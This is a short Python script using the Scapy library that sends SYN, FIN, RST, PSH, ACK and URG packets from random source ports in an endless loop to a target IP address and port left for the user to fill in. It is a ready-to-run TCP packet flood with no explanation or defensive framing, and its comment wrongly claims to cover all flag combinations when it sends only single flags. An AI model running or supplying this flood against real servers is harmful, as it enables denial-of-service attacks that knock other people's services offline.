from scapy.all import *

target_ip = '192.168.1.37'  # replace with the IP address of your target server
target_port = 5000  # replace with the port your server is running on

while True:
    # Generate a random source port for each packet
    sport = RandShort()
    try:
        # Create a TCP packet with all possible flag combinations
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='S')  # SYN packets
        send(packets)
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='F')  # FIN packets
        send(packets)
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='R')  # RST packets
        send(packets)
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='P')  # PUSH packets
        send(packets)
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='A')  # ACK packets
        send(packets)
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='U')  # URG packets
        send(packets)
        packets = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags='S')  # SYN packets (again)
        send(packets)
        print("Sent Everything")
    except:
        print("Failed to send everything")